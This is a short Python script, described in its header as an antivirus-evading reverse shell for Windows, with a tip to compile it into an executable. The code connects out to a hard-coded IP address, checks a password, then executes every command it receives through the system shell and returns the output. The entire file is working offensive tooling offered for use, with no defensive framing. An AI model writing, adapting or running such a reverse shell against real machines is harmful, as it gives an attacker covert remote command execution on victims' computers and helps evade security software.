#!/usr/bin/python
# -*- coding: cp1252 -*-
#
# avev-revshell Stands for AntiVirus EVade Reverse Shell
#
# alacerda's version of a simple reverse shell in Python
#
# For Windows
# use pyinstall -F <filename> to generate .exe file
#

import socket,subprocess

IP="192.168.25.24"
PORT=80
PASSWD="my_pass"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
s.connect((IP, PORT))

cmd = s.recv(512)
if cmd.rstrip() == PASSWD:
    s.send("[*] We've got a shell...\n")
    s.send("[*] Welcome home!\n")
    while 1:
        cmd = s.recv(512)
        if cmd.rstrip() == "exit_shell": break
        try:
            process = subprocess.check_output(cmd,shell=True)
            s.send(process)
        except:
            pass
else:
    s.send("[*] Get out of here!\n")
s.close()
